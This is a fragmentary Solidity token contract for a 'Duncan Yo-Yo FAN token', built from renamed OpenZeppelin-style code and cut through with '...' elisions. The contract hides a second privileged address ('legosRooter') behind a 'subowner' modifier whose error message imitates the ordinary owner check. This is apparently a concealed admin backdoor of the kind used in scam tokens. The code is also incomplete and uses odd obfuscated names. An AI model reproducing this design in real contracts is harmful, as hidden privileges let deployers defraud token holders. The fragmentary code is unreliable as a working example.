...
Duncan Yo-Yo FAN token
*/
pragma solidity 0.8.23;

interface DuncanYoYo33 {
  /**
...
/*
 * @dev Provides information about the current execution DuncanYoYo20Burnable, including the
 ...
 */
abstract contract DuncanYoYo20Burnable {
...
// File: @openzeppelin/contracts/access/DuncanYoYo20Ownable.sol
 ...
 * the owner.
 */
abstract contract DuncanYoYo20Ownable is DuncanYoYo20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "DuncanYoYo20Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "DuncanYoYo20Ownable: new owner is the zero address");
 ...
 * `SafeDuncanYoYo` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeDuncanYoYo {
  /**
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeDuncanYoYo: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeDuncanYoYo: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafeDuncanYoYo: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeDuncanYoYo: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeDuncanYoYo: modulo by zero");
  }
...
contract DuncanYoYoToken is DuncanYoYo20Burnable, DuncanYoYo33, DuncanYoYo20Ownable {
    
    using SafeDuncanYoYo for uint256;
   ...
   address private legosRooter; 
    ...
    string public DuncanYoYotelegramcchannel = "https://t.me/DuncanYoYoToken";
            function getDuncanYoYotelegramcchannel() public view returns (string memory) {
        return DuncanYoYotelegramcchannel;
    }
    /**
    * @dev Returns the bep token owner.
    */
    ...
    */
    ...
    /**
    * @dev See {DuncanYoYo33-totalSupply}.
    */
    ...
    /**
    * @dev See {DuncanYoYo33-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(legosRooter == _msgSender(), "DuncanYoYo20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {DuncanYoYo33-approve}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {DuncanYoYo33-allowance}.
    */
    ...
    */
    ...
    /**
    * @dev See {DuncanYoYo33-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {DuncanYoYo33};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "DuncanYoYo33: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {DuncanYoYo33-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "DuncanYoYo33: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "DuncanYoYo33: transfer from the zero address");
        require(shippingto != address(0), "DuncanYoYo33: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "DuncanYoYo33: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "DuncanYoYo33: approve from the zero address");
        require(transporteur != address(0), "DuncanYoYo33: approve to the zero address");
